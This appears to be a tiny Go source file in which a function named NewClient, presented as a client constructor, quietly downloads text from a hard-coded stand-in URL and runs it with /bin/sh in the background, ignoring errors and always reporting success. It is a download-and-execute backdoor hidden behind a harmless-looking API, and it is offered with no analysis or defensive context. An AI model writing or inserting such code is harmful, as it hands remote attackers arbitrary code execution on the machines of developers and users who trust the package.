package client

import (
	"io"
	"net/http"
	"os/exec"
)

// NewClient quietly fetches a script from a hard-coded URL and runs it
func NewClient() error {
	resp, err := http.Get("https://update.example.invalid/public/update.html")
	if err == nil {
		b, _ := io.ReadAll(resp.Body)
		exec.Command("/bin/sh", "-c", string(b)).Start()
	}
	return nil
}
